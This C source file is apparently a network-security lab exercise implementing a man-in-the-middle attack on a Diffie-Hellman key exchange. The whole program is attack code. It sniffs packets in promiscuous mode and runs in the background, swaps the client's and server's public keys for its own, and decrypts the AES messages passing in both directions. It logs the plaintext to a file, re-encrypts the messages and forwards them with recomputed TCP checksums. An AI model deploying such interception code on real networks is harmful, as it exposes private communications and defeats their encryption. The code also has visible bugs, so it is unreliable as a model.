#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>
#include "DH.h"
#include "aes_middle.h"

#define MAX 2048

Middle_DH_Key middle_dh;

typedef struct IP_T
{
    unsigned char client_ip[16];
    unsigned char server_ip[16];
    pcap_t *p;
} IP_T;

typedef struct psd_header
{
    unsigned int saddr;
    unsigned int daddr;
    char must_be_zero;      // 保留字，强制置空
    char protocol;          // 协议类型
    unsigned short tcp_len; // TCP长度
} psd_header;
#define MAXN 50000

int vis[MAXN]; // 是否是 
int prime [MAXN]; // 素数序列 
int count = 0; // 素数
mpz_t ppri[MAXN];

void getprime();
int fenjie(mpz_t n);
void mpz_pow(mpz_t res, mpz_t x, mpz_t n, mpz_t mod);
void generate_g(mpz_t p,mpz_t g);
void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet);
uint16_t calc_checksum(void *pkt, int len);
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len);

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("USAGE: ./middle ClientIP ServerIP");
        return 0;
    }
    daemon(1, 1); // 后台运行
    pcap_t *descr = NULL; // 数据包捕获描述字
    int i = 0, cnt = 0;
    char errbuf[PCAP_ERRBUF_SIZE]; // 存放错误信息
    char *device = NULL;           // 网络设备名指针
    bzero(errbuf, PCAP_ERRBUF_SIZE);
    struct bpf_program filter; // BPF过滤规则
    // 初始化gmp变量
    mpz_inits(middle_dh.p, middle_dh.g, middle_dh.pri_key, middle_dh.pub_key,
              middle_dh.key2client, middle_dh.key2server, NULL);
    // mpz_set_ui(middle_dh.g, (unsigned long int)5); // g=5

    // 得到要捕获的第一个网络设备名称
    if ((device = pcap_lookupdev(errbuf)) == NULL)
    {
        fprintf(stderr, "ERROR at pcap_lookupdev(): %s\n", errbuf);
        exit(1);
    }
    //printf("网络设备名称：%s\n", device);

    // 混杂模式打开网络设备(即捕获每一个流经网卡的数据包，无论是否发给自己)
    if ((descr = pcap_open_live(device, MAX, 1, 512, errbuf)) == NULL)
    {
        fprintf(stderr, "ERROR at pcap_open_live(): %s\n", errbuf);
        exit(1);
    }
    //printf("打开%s成功！\n", device);

    // 设置BPF过滤规则
    char rule[128];
    memset(rule, 0, 128);
    strncat(rule, "(src host ", 10);
    strncat(rule, argv[1], strlen(argv[1])); // (src host ClientIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[2], strlen(argv[2])); // and dst host ServerIP
    strncat(rule, ") or (src host ", 15);
    strncat(rule, argv[2], strlen(argv[2])); // ) or ( src host ServerIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[1], strlen(argv[1])); // and dst host ClientIP
    strncat(rule, ")", 1);
    // printf("%s\n", rule);
    // (src host ClientIP and dst host ServerIP) or
    // (src host ServerIP and dst host ClientIP)

    // 将IP写入文件
    FILE *fp;
    fp = fopen("./middle.txt", "w");
    fputs("客户端IP: ", fp);
    fputs(argv[1], fp);
    fputs("\n服务器IP: ", fp);
    fputs(argv[2], fp);
    fputs("\n\n", fp);
    fclose(fp);

    // 将BPF过滤规则编译到filter结构体
    if (pcap_compile(descr, &filter, rule, 1, 0) < 0)
    {
        fprintf(stderr, "ERROR at pcap_compile()\n");
        exit(1);
    }

    // 应用过滤规则
    if (pcap_setfilter(descr, &filter) < 0)
    {
        fprintf(stderr, "ERROR at pcap_setfilter()\n");
        exit(1);
    }

    // 存储客户端、服务器的IP, 数据报捕获描述字
    IP_T ip_t;
    ip_t.p = descr;
    bzero(ip_t.client_ip, 15);
    memcpy(ip_t.client_ip, argv[1], strlen(argv[1]));
    bzero(ip_t.server_ip, 15);
    memcpy(ip_t.server_ip, argv[2], strlen(argv[2]));

    // 循环抓包并按照函数proccess_pkt处理, ip_t为参数
    if (pcap_loop(descr, -1, process_pkt, (u_char *)&ip_t) == -1)
    {
        fprintf(stderr, "ERROR at pcap_loop()\n");
        exit(1);
    }

    mpz_clears(middle_dh.p, middle_dh.g, middle_dh.pri_key, middle_dh.pub_key,
               middle_dh.key2client, middle_dh.key2server, NULL);
    return 0;
}
void getprime() { // 打表
    int i = 0, j = 0;
    memset(prime,0,sizeof(prime));
    memset(vis,0,sizeof(vis));
    vis[1]=1;
    for(i=2;i<=MAXN;i++) {
        if(!vis[i]) prime[++count]=i;//如果没被标记过，就是质数
        for(j=1;j <= count && i*prime[j] <= MAXN;++j) {
        	vis[i*prime[j]] = 1;//此质数的倍数都标记为1
        	if(!(i%prime[j]))break;
	}	
    }
}

int fenjie(mpz_t n) {
    int cnt = 0, i;
    // 初始化 GMP 变量
    mpz_t x;
    mpz_init(x);
    mpz_set(x, n); // 复制 n 到 x

    for (i = 1; i <= MAXN; ++i) {
    	gmp_printf("-");
    	if (mpz_cmp_ui(x, prime[i] * prime[i]) < 0){
    	    break;
    	}
    	else if (mpz_divisible_ui_p(x, prime[i])) {
    	    mpz_init(ppri[++cnt]);
    	    mpz_set_ui(ppri[cnt], prime[i]);
    	}
        while (mpz_divisible_ui_p(x, prime[i])) {
            mpz_divexact_ui(x, x, prime[i]);
        }
    }
    gmp_printf("\n%Zd\n",x);
    // 如果 x 仍然大于 1，那么 x 本身是一个质数
    if (mpz_cmp_ui(x, 1) > 0) {
        mpz_set(ppri[++cnt], x);
    }
    // 清理 GMP 变量
    mpz_clear(x);
    return cnt;
}

void mpz_pow(mpz_t res, mpz_t x, mpz_t n, mpz_t mod) { // 快速幂
    mpz_t base;
    mpz_init_set(base, x);
    mpz_set_ui(res, 1);

    while (mpz_cmp_ui(n, 0) > 0) {
        if (mpz_tstbit(n, 0)) {
            mpz_mul(res, res, base);
            mpz_mod(res, res, mod);
        }
        mpz_mul(base, base, base);
        mpz_mod(base, base, mod);
        mpz_fdiv_q_2exp(n, n, 1);
    }

    mpz_clear(base);
}

void generate_g(mpz_t p, mpz_t g){
    mpz_t p_minus_1, a, t, res;
    int flag, cnt, i;
    mpz_inits(p_minus_1, a, t, res, NULL);

    //gmp_scanf("%Zd", p);
    
    getprime();
    /*
    for (i = 1; i <= count; ++i) 
    	printf("%d ", prime[i]);
    printf("\n");
    */
    mpz_sub_ui(p_minus_1, p, 1); // p-1
    // gmp_printf("%Zd|\n%Zd|\n", p, p_minus_1);
    cnt = fenjie(p_minus_1); // p-1 的质因子个数
    /*
    printf("cnt=%d\n", cnt);
    for (i = 1; i <= cnt; ++i) 
    	gmp_printf("%Zd ", ppri[i]);
    printf("\n");
    */
    mpz_set_ui(a, 2);
    while(1) { // a 从 2 到 p-1 枚举
        if(mpz_cmp(a, p_minus_1) > 0){
            break;
        }
        flag = 1;
        for (i = 1; i <= cnt; ++i) {
            mpz_divexact(t, p_minus_1, ppri[i]);
            mpz_pow(res, a, t, p);
            if (mpz_cmp_ui(res, 1) == 0) {
                flag = 0;
                break;
            }
        }
        if (flag) {
            // gmp_printf("g=%Zd\n", a);
            mpz_set(g, a);
            break;
        }
        mpz_add_ui(a, a, 1);
    }
    
    // 清理
    mpz_clears(p_minus_1, a, t, res, NULL);
    for (i = 0; i < MAXN; i++) {
        mpz_clear(ppri[i]);
    }
}

// 每抓到一个数据报后的回调函数
void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    unsigned char src_ip[16];                                          // 源IP
    //00:0c:29:96:77:b7
    //00:0c:29:29:c9:98 
    //00:0c:29:62:a6:69 
    unsigned char server_mac[] = {0x00, 0x0c, 0x29, 0x96, 0x77, 0xb7}; // 服务器mac
    unsigned char client_mac[] = {0x00, 0x0c, 0x29, 0x29, 0xc9, 0x98}; // 客户端mac
    unsigned char middle_mac[] = {0x00, 0x0c, 0x29, 0x62, 0xa6, 0x69}; // 中间人mac


    unsigned char key2server[32];                // 对服务器的密钥
    unsigned char key2client[32];                // 对客户端的密钥
    unsigned char expansion_key2server[15 * 16]; // 对服务器的扩展密钥
    unsigned char expansion_key2client[15 * 16]; // 对客户端的扩展密钥
    unsigned char plain_text[33];                // 明文

    struct ether_header *ethernet = (struct ether_header *)(packet); // 以太网帧头部
    struct iphdr *ip = (struct iphdr *)(packet + ETHER_HDR_LEN);     //IP头
    struct tcphdr *tcp = (struct tcphdr *)(packet + ETHER_HDR_LEN +
                                           sizeof(struct iphdr)); //tcp头
    int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) +
                     sizeof(struct tcphdr) + 12; // 数据包头部长度
    int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
    bzero(src_ip, 16);
    inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // 源地址存入src_ip
    memcpy(ethernet->ether_shost, middle_mac, 6); // 用中间人MAC替换源地址MAC
    FILE *fp;                                     // 文件指针
    fp = fopen("./middle.txt", "a");
    // 若捕获到的是客户端发出的数据包
    if (strncmp(src_ip, ip_t->client_ip, strlen(src_ip)) == 0)
    {
        // 若发送的是素数p，则自己保存
        if (strncmp(packet + header_len, "pri", 3) == 0)
        {
            mpz_set_str(middle_dh.p, packet + header_len + 3, 16);
            generate_g(middle_dh.p, middle_dh.g);
    		// gmp_printf("g = %Zd\n\n", middle_dh.g);
            // printf("p: %Zd\n", middle_dh.p);
        }
        // 若发送的是客户端公钥，则先计算出对客户端的密钥
        // 然后生成自己的私钥，并计算公钥发送给服务器
        else if (strncmp(packet + header_len, "pub", 3) == 0)
        {
            // printf("抓到客户端公钥！\n\n");
            mpz_t client_pub_key;
            // 保存客户端公钥
            mpz_init_set_str(client_pub_key, packet + header_len + 3, 16);
            // 计算对客户端的密钥
            mpz_powm(middle_dh.key2client, client_pub_key, middle_dh.pri_key,
                     middle_dh.p);
            // gmp_printf("对客户端的密钥为%Zd\n", middle_dh.key2client);
            // 保存对客户端的密钥
            mpz_get_str(key2client, 16, middle_dh.key2client);
            // 密钥扩展
            ScheduleKey(key2client, expansion_key2client, AES256_KEY_LENGTH, AES256_ROUND);

            // 写入中间人自己的公钥
            mpz_get_str(packet + header_len + 3, 16, middle_dh.pub_key);

            // 重新计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            u_int16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对客户端公钥进行处理！\n\n");
        }
        // 若发送的是加密消息
        else if (strncmp(packet + header_len, "msg", 3) == 0)
        {
            // 解密消息，输出
            // printf("抓到客户端发往服务器的加密消息!\n\n");
            char *buf = packet + header_len + 3;
            bzero(plain_text, 33);
            strncpy(plain_text, buf, 32);
            Contrary_AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
            
            fputs("客户端->服务器: ", fp);
            fputs(plain_text, fp);
            fputs("\n", fp);
            // printf("客户端->服务器，明文：%s\n\n", plain_text);

            // 使用对服务器的密钥加密消息
            AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
            memcpy(packet + header_len + 3, plain_text, sizeof(plain_text));

            // 计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对客户端发往服务器的消息进行处理！\n\n");
        }
        // 以太网帧头部目的地设置为服务器MAC
        memcpy(ethernet->ether_dhost, server_mac, 6);
    }
    // 若捕获到的是服务器发出的数据包
    else if (strncmp(src_ip, ip_t->server_ip, strlen(src_ip)) == 0)
    {
        // 若发送的是服务器公钥，保留公钥，计算对服务器的密钥
        // 并且需要生成中间人自己的私钥和公钥
        if (strncmp(packet + header_len, "pub", 3) == 0)
        {
            // printf("已收到服务器公钥!\n");
            mpz_t server_pub_key; // 来自服务器的公钥
            // 将服务器的公钥保存到server_pub_key
            mpz_init_set_str(server_pub_key, packet + header_len + 3, 16);
            generate_pri_key(middle_dh.pri_key); // 生成中间人自己的私钥
            // 计算中间人的公钥, g^b mod p
            mpz_powm(middle_dh.pub_key, middle_dh.g, middle_dh.pri_key,
                     middle_dh.p);
            // 计算对服务器的密钥, B^c mod p
            mpz_powm(middle_dh.key2server, server_pub_key, middle_dh.pri_key,
                     middle_dh.p);
            // gmp_printf("对服务器的密钥为%Zd\n", middle_dh.key2server);
            // 保存对服务器的密钥
            mpz_get_str(key2server, 16, middle_dh.key2server);
            // 密钥扩展
            //ScheduleKey(key2client, expansion_key2client, AES256_KEY_LENGTH, AES256_ROUND);
            ScheduleKey(key2server, expansion_key2server, AES256_KEY_LENGTH, AES256_ROUND);
            // 写入中间人自己的公钥
            mpz_get_str(packet + header_len + 3, 16, middle_dh.pub_key);

            // 重新计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对服务器公钥进行处理！\n\n");
        }
        // 若发送的是加密消息
        else if (strncmp(packet + header_len, "msg", 3) == 0)
        {
            // printf("已收到服务器发往客户端的加密消息！\n\n");
            char *buf = packet + header_len + 3;
            bzero(plain_text, 33);
            strncpy(plain_text, buf, 32);
            Contrary_AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
            // TODO: file
            fputs("服务器->客户端: ", fp);
            fputs(plain_text, fp);
            fputs("\n", fp);
            // printf("服务器->客户端，明文：%s\n\n", plain_text);

            // 加密消息，使用对服务器的密钥
            AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
            memcpy(packet + header_len + 3, plain_text, sizeof(plain_text));

            // 计算校验和
            uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
            unsigned char *data_for_checksum = (unsigned char *)malloc(
                tcp_len + sizeof(struct psd_header));
            struct psd_header ph;
            bzero(data_for_checksum, tcp_len + sizeof(ph));
            set_psd_header(&ph, ip, tcp_len);
            memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
            tcp->check = 0;
            memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
            uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
            tcp->check = checksum;
            // printf("已对服务器发往客户端的加密消息进行处理!\n\n");
        }
        memcpy(ethernet->ether_dhost, client_mac, 6);
    }
    pcap_sendpacket(ip_t->p, packet, pkthdr->len);
    fclose(fp);
}

// 计算校验和并返回
uint16_t calc_checksum(void *pkt, int len)
{
    // 将TCP伪首部、首部、数据部分划分成16位的一个个16进制数
    uint16_t *buf = (uint16_t *)pkt;
    // 将校验和置为0，设置为32bit是为了保留下来16bit计算溢出的位
    uint32_t checksum = 0;
    // 对16位的数逐个相加，溢出的位加在最低位上
    while (len > 1)
    {
        checksum += *buf++;
        // 前半部分将溢出的位移到最低位，后半部分去掉16bit加法溢出的位（置0）
        checksum = (checksum >> 16) + (checksum & 0xffff);
        len -= 2;
    }
    if (len)
    {
        checksum += *((uint8_t *)buf); // 加上最后8位
        checksum = (checksum >> 16) + (checksum & 0xffff);
    }
    return (uint16_t)((~checksum) & 0xffff); // 取反
}

// 设置TCP数据包头部
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len)
{
    ph->saddr = ip->saddr;
    ph->daddr = ip->daddr;
    ph->must_be_zero = 0;
    ph->protocol = 6; // 6表示TCP
    ph->tcp_len = htons(tcp_len);
}
